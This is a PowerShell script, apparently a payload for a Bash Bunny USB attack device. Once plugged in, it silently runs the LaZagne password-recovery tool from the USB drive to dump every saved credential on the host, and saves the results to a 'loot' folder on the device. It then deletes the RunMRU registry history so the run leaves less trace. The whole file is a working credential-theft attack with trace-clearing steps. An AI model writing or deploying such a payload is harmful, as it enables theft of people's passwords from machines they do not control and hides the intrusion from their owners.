$drivelabel = 'BashBunny'
$dest = ((Get-WmiObject win32_volume -f 'label=''$drivelabel''').Name+'loot\PasswordGrabber')
$filter = 'password_'+ $env:COMPUTERNAME
$filecount = ((Get-ChildItem -filter ($filter + "*") -path $dest | Measure-Object | Select -ExpandProperty Count) + 1)
Start-Process -WindowStyle Hidden -FilePath ((Get-WmiObject win32_volume -f 'label=''$drivelabel''').Name+'tooling\LaZagne.exe') -ArgumentList 'all -vv' -RedirectStandardOutput ($dest +'\' + $filter +'_' + $filecount +'.txt')
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
